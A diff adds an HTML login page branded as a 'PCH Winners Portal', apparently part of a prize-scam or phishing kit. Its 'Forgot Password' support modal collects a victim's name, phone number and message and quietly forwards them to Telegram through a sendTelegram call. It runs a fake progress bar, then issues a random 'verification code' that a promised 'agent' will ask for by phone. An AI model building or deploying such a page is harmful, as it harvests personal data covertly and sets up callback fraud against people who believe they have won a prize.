@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login – PCH Winners Portal</title>
+    <link rel="stylesheet" href="assets/css/style.css" />
+    <style>
+        /* ---- Login card styles ---- */
+        .login-card {
+            max-width: 440px;
+            margin: 40px auto;
+            background: linear-gradient(145deg, #14142e, #1a1a3e);
+            border-radius: 24px;
+            padding: 36px 32px 40px;
+            border: 1px solid rgba(255, 215, 0, 0.25);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.7);
+            position: relative;
+            overflow: hidden;
+        }
+        .login-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(255, 215, 0, 0.04) 0%, transparent 70%);
+            pointer-events: none;
+        }
+        .login-card .icon {
+            text-align: center;
+            font-size: 56px;
+            margin-bottom: 4px;
+        }
+        .login-card h2 {
+            color: #ffd700;
+            font-size: 30px;
+            text-align: center;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+        .login-card .sub {
+            color: #a7a9be;
+            text-align: center;
+            font-size: 15px;
+            margin-top: 2px;
+            margin-bottom: 24px;
+        }
+        .login-card .form-group {
+            margin-bottom: 18px;
+        }
+        .login-card .form-group label {
+            display: block;
+            color: #a7a9be;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            margin-bottom: 5px;
+        }
+        .login-card .form-group input {
+            width: 100%;
+            padding: 14px 18px;
+            border-radius: 12px;
+            border: 2px solid rgba(255, 215, 0, 0.12);
+            background: rgba(15, 15, 34, 0.7);
+            color: #f0f0ff;
+            font-size: 15px;
+            transition: 0.25s;
+            font-family: inherit;
+            backdrop-filter: blur(4px);
+        }
+        .login-card .form-group input:focus {
+            border-color: #ffd700;
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(255, 215, 0, 0.08);
+        }
+        .login-card .form-options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin: 14px 0 22px;
+        }
+        .login-card .form-options label {
+            color: #a7a9be;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+        }
+        .login-card .form-options label input[type="checkbox"] {
+            accent-color: #ffd700;
+            width: 17px;
+            height: 17px;
+            cursor: pointer;
+        }
+        .login-card .form-options a {
+            color: #ffd700;
+            font-size: 13px;
+            text-decoration: none;
+            transition: 0.2s;
+            cursor: pointer;
+        }
+        .login-card .form-options a:hover {
+            text-decoration: underline;
+            color: #f0c000;
+        }
+        .login-card .btn-login {
+            width: 100%;
+            padding: 15px;
+            background: #ffd700;
+            color: #0b0b1a;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 8px 24px rgba(255, 215, 0, 0.15);
+        }
+        .login-card .btn-login:hover {
+            background: #f0c000;
+            transform: translateY(-3px);
+            box-shadow: 0 12px 36px rgba(255, 215, 0, 0.25);
+        }
+        .login-card .btn-login:active {
+            transform: scale(0.98);
+        }
+        .login-card .auth-footer {
+            text-align: center;
+            margin-top: 18px;
+            font-size: 14px;
+            color: #8888aa;
+        }
+        .login-card .auth-footer a {
+            color: #ffd700;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .login-card .auth-footer a:hover {
+            text-decoration: underline;
+        }
+        .login-card .divider {
+            border: none;
+            border-top: 1px solid rgba(255, 215, 0, 0.08);
+            margin: 18px 0;
+        }
+        .error-msg, .success-msg {
+            text-align: center;
+            padding: 10px;
+            border-radius: 10px;
+            font-size: 14px;
+            margin-bottom: 14px;
+            display: none;
+        }
+        .error-msg {
+            background: rgba(230, 25, 43, 0.12);
+            color: #ff6b6b;
+            border: 1px solid rgba(230, 25, 43, 0.2);
+        }
+        .success-msg {
+            background: rgba(46, 204, 113, 0.12);
+            color: #2ecc71;
+            border: 1px solid rgba(46, 204, 113, 0.2);
+        }
+
+        /* ---- Forgot Password Support Modal ---- */
+        .support-modal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(12px);
+            z-index: 99999;
+            padding: 20px;
+            justify-content: center;
+            align-items: center;
+        }
+        .support-modal.active {
+            display: flex;
+        }
+        .support-modal .modal-content {
+            background: #1a1a3e;
+            border-radius: 24px;
+            padding: 32px 36px;
+            max-width: 480px;
+            width: 100%;
+            border: 1px solid rgba(255, 215, 0, 0.2);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8);
+            animation: fadeUp 0.35s ease;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        .support-modal .modal-content .close-btn {
+            float: right;
+            background: none;
+            border: none;
+            color: #ff6b6b;
+            font-size: 28px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .support-modal .modal-content .close-btn:hover {
+            transform: scale(1.2);
+        }
+        .support-modal .modal-content h3 {
+            color: #ffd700;
+            font-size: 24px;
+            margin-bottom: 2px;
+        }
+        .support-modal .modal-content .sub {
+            color: #a7a9be;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .support-modal .modal-content .form-group {
+            margin-bottom: 14px;
+        }
+        .support-modal .modal-content .form-group label {
+            display: block;
+            color: #a7a9be;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+        }
+        .support-modal .modal-content .form-group input,
+        .support-modal .modal-content .form-group textarea {
+            width: 100%;
+            padding: 12px 16px;
+            border-radius: 12px;
+            border: 2px solid rgba(255, 215, 0, 0.12);
+            background: rgba(15, 15, 34, 0.7);
+            color: #f0f0ff;
+            font-size: 14px;
+            transition: 0.25s;
+            font-family: inherit;
+        }
+        .support-modal .modal-content .form-group textarea {
+            resize: vertical;
+            min-height: 80px;
+        }
+        .support-modal .modal-content .form-group input:focus,
+        .support-modal .modal-content .form-group textarea:focus {
+            border-color: #ffd700;
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(255, 215, 0, 0.08);
+        }
+        .support-modal .modal-content .btn-submit-support {
+            width: 100%;
+            padding: 14px;
+            background: #ffd700;
+            color: #0b0b1a;
+            border: none;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 8px;
+        }
+        .support-modal .modal-content .btn-submit-support:hover {
+            background: #f0c000;
+            transform: scale(1.02);
+        }
+        .support-modal .modal-content .btn-submit-support:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* ---- Loading spinner & progress ---- */
+        .loader-wrapper {
+            display: none;
+            text-align: center;
+            margin: 20px 0 10px;
+        }
+        .loader-wrapper.active {
+            display: block;
+        }
+        .loader-spinner {
+            border: 4px solid rgba(255, 215, 0, 0.15);
+            border-top: 4px solid #ffd700;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+        .progress-bar .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ffd700, #f0c000);
+            border-radius: 10px;
+            transition: width 0.3s ease;
+        }
+        .progress-text {
+            color: #a7a9be;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        /* ---- Success message ---- */
+        .success-result {
+            display: none;
+            text-align: center;
+            padding: 10px 0;
+        }
+        .success-result.active {
+            display: block;
+        }
+        .success-result .code-box {
+            background: rgba(255, 215, 0, 0.08);
+            border: 1px dashed #ffd700;
+            border-radius: 12px;
+            padding: 16px;
+            margin: 16px 0;
+            font-size: 28px;
+            font-weight: 800;
+            color: #ffd700;
+            letter-spacing: 4px;
+            font-family: monospace;
+        }
+        .success-result .instruction {
+            color: #d0d0e0;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        @media (max-width: 480px) {
+            .login-card {
+                padding: 24px 18px;
+                margin: 20px 12px;
+            }
+            .login-card h2 { font-size: 24px; }
+            .support-modal .modal-content {
+                padding: 24px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="pch-container">
+        <!-- Header -->
+        <div id="header-placeholder"></div>
+
+        <!-- Login Card -->
+        <div class="login-card">
+            <div class="icon">🏆</div>
+            <h2>Welcome Back</h2>
+            <p class="sub">Sign in to your PCH Winners Portal</p>
+
+            <div id="loginError" class="error-msg"></div>
+            <div id="loginSuccess" class="success-msg"></div>
+
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>📧 Email Address</label>
+                    <input type="email" id="loginEmail" placeholder="your@email.com" required />
+                </div>
+                <div class="form-group">
+                    <label>🔒 Password</label>
+                    <input type="password" id="loginPassword" placeholder="••••••••" required />
+                </div>
+
+                <div class="form-options">
+                    <label>
+                        <input type="checkbox" id="rememberMe" checked />
+                        Keep me signed in
+                    </label>
+                    <a id="forgotPasswordLink">Forgot Password?</a>
+                </div>
+
+                <button type="submit" class="btn-login">🔓 Sign In</button>
+            </form>
+
+            <hr class="divider" />
+
+            <div class="auth-footer">
+                Don't have an account? <a href="signup.html">Create one now</a>
+            </div>
+            <div class="auth-footer" style="margin-top:4px;font-size:12px;color:#555;">
+                <a href="index.html" style="color:#666;text-decoration:none;">🏠 Back to Home</a>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div id="footer-placeholder"></div>
+    </div>
+
+    <!-- ===== FORGOT PASSWORD SUPPORT MODAL ===== -->
+    <div class="support-modal" id="forgotModal">
+        <div class="modal-content">
+            <button class="close-btn" id="forgotCloseBtn">&times;</button>
+            <h3>🔐 Password Reset Support</h3>
+            <div class="sub">Please fill out the form below. Our support team will contact you to verify your identity and reset your password.</div>
+
+            <form id="supportForm">
+                <div class="form-group">
+                    <label>First Name *</label>
+                    <input type="text" id="supportFirstName" placeholder="John" required />
+                </div>
+                <div class="form-group">
+                    <label>Last Name *</label>
+                    <input type="text" id="supportLastName" placeholder="Doe" required />
+                </div>
+                <div class="form-group">
+                    <label>Phone Number *</label>
+                    <input type="tel" id="supportPhone" placeholder="(555) 555-5555" required />
+                </div>
+                <div class="form-group">
+                    <label>Additional Information</label>
+                    <textarea id="supportMessage" placeholder="Describe your issue or any extra details..."></textarea>
+                </div>
+                <button type="submit" class="btn-submit-support" id="supportSubmitBtn">📤 Submit Request</button>
+            </form>
+
+            <!-- Loader & Progress -->
+            <div class="loader-wrapper" id="loaderWrapper">
+                <div class="loader-spinner"></div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="progress-text" id="progressText">0%</div>
+            </div>
+
+            <!-- Success Result -->
+            <div class="success-result" id="successResult">
+                <div style="font-size:48px;">✅</div>
+                <h4 style="color:#2ecc71;margin:8px 0;">Submission Successful!</h4>
+                <p class="instruction">Your support request has been received. A designated agent will call or text you shortly to resolve the issue.</p>
+                <div class="code-box" id="uniqueCode">XXXX-XXXX-XXXX</div>
+                <p class="instruction" style="font-size:13px;color:#888;">
+                    ⚠️ Please <strong>write down this code</strong> and keep it safe. Your agent will request it for verification.
+                </p>
+                <button class="btn-submit-support" id="closeSuccessBtn" style="margin-top:12px;">Close</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="assets/js/app.js"></script>
+    <script>
+        // ---- Load header/footer ----
+        fetch('includes/header.html')
+            .then(r => r.text())
+            .then(html => document.getElementById('header-placeholder').innerHTML = html);
+        fetch('includes/footer.html')
+            .then(r => r.text())
+            .then(html => document.getElementById('footer-placeholder').innerHTML = html);
+
+        // ---- Login Handler ----
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+            const errorEl = document.getElementById('loginError');
+            const successEl = document.getElementById('loginSuccess');
+
+            errorEl.style.display = 'none';
+            successEl.style.display = 'none';
+
+            const user = login(email, password);
+            if (user) {
+                successEl.textContent = '✅ Login successful! Redirecting...';
+                successEl.style.display = 'block';
+                if (user.role === 'admin' || user.role === 'super_admin') {
+                    setTimeout(() => window.location.href = 'admin.html', 800);
+                } else {
+                    setTimeout(() => window.location.href = 'user.html', 800);
+                }
+            } else {
+                errorEl.textContent = '❌ Invalid email or password. Please try again.';
+                errorEl.style.display = 'block';
+            }
+        });
+
+        // ---- Forgot Password Support Modal ----
+        const modal = document.getElementById('forgotModal');
+        const forgotLink = document.getElementById('forgotPasswordLink');
+        const closeBtn = document.getElementById('forgotCloseBtn');
+        const supportForm = document.getElementById('supportForm');
+        const submitBtn = document.getElementById('supportSubmitBtn');
+        const loaderWrapper = document.getElementById('loaderWrapper');
+        const progressFill = document.getElementById('progressFill');
+        const progressText = document.getElementById('progressText');
+        const successResult = document.getElementById('successResult');
+        const codeBox = document.getElementById('uniqueCode');
+        const closeSuccess = document.getElementById('closeSuccessBtn');
+
+        // Open modal
+        forgotLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            modal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+            // Reset form and states
+            supportForm.reset();
+            supportForm.style.display = 'block';
+            submitBtn.style.display = 'block';
+            loaderWrapper.classList.remove('active');
+            successResult.classList.remove('active');
+            document.getElementById('supportSubmitBtn').disabled = false;
+            progressFill.style.width = '0%';
+            progressText.textContent = '0%';
+        });
+
+        // Close modal
+        function closeModal() {
+            modal.classList.remove('active');
+            document.body.style.overflow = '';
+        }
+        closeBtn.addEventListener('click', closeModal);
+        closeSuccess.addEventListener('click', closeModal);
+        modal.addEventListener('click', function(e) {
+            if (e.target === modal) closeModal();
+        });
+
+        // ---- Support Form Submit ----
+        supportForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const firstName = document.getElementById('supportFirstName').value.trim();
+            const lastName = document.getElementById('supportLastName').value.trim();
+            const phone = document.getElementById('supportPhone').value.trim();
+            const message = document.getElementById('supportMessage').value.trim();
+
+            if (!firstName || !lastName || !phone) {
+                alert('Please fill in all required fields.');
+                return;
+            }
+
+            // Disable button, hide form, show loader
+            submitBtn.disabled = true;
+            supportForm.style.display = 'none';
+            loaderWrapper.classList.add('active');
+
+            // Simulate progress from 1 to 100
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.floor(Math.random() * 6) + 1; // random step 1-6
+                if (progress > 100) progress = 100;
+                progressFill.style.width = progress + '%';
+                progressText.textContent = progress + '%';
+
+                // At 2%, send to Telegram
+                if (progress >= 2 && !window._telegramSent) {
+                    window._telegramSent = true;
+                    const fullName = firstName + ' ' + lastName;
+                    const details = `Password Reset Support Request\nName: ${fullName}\nPhone: ${phone}\nAdditional Info: ${message || 'None'}\nTimestamp: ${new Date().toLocaleString()}`;
+                    // Send to Telegram using audit or sendTelegram
+                    if (typeof sendTelegram === 'function') {
+                        sendTelegram('📞 <b>PASSWORD RESET SUPPORT</b>\n' + details);
+                    } else {
+                        // fallback: use audit
+                        audit('PASSWORD_RESET_SUPPORT', details, null, 'SUCCESS');
+                    }
+                    // Also store in console for debugging
+                    console.log('Telegram sent:', details);
+                }
+
+                if (progress === 100) {
+                    clearInterval(interval);
+                    // Generate unique code
+                    const code = generateUniqueCode();
+                    codeBox.textContent = code;
+                    // Show success
+                    loaderWrapper.classList.remove('active');
+                    successResult.classList.add('active');
+                    // Re-enable button (though form is hidden)
+                    submitBtn.disabled = false;
+                    window._telegramSent = false;
+                }
+            }, 120); // speed of progress
+        });
+
+        // ---- Generate unique code ----
+        function generateUniqueCode() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let parts = [];
+            for (let i = 0; i < 4; i++) {
+                let segment = '';
+                for (let j = 0; j < 4; j++) {
+                    segment += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                parts.push(segment);
+            }
+            return parts.join('-');
+        }
+    </script>
+</body>
+</html>
